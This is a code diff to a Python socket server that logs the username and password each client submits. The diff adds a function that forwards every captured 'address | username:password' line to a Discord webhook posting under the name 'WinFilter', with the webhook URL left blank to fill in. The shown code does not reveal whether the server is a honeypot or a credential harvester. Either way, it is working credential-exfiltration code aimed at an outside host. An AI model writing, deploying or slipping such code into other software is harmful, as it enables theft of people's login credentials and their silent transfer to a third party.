@@ -1,4 +1,5 @@
 import socket
+import requests
 import threading
 import argparse
 import os
@@ -21,9 +22,33 @@ def handle_client(conn, addr):
     timestamp = datetime.datetime.now().strftime("%G-%m-%d %H:%M:%S")
     storage = f"\nTimestamp: {timestamp}\nSource: {addr}\nType: {type}\nUsername: {username} \nPassword: {password}\n\n"
     print(storage)
+
+    discordWH(addr, username, password)
+
     writeFile(storage, addr)
+
     if not data:
         print_lock.release()
+
+
+def discordWH(addr, username, password):
+    url = "" # modify this
+
+    # Setup Post Request
+    post = {}
+    data = {
+        "content" : f"{addr} | {username}:{password}",
+        "username" : "WinFilter"
+    }
+
+    # Send and check result
+    result = requests.post(url, json = data)
+    try:
+        result.raise_for_status()
+    except requests.exceptions.HTTPError as err:
+        print(err)
+    else:
+        print("Payload delivered successfully, code {}.".format(result.status_code))
 
 
 def writeFile(storage, addr):
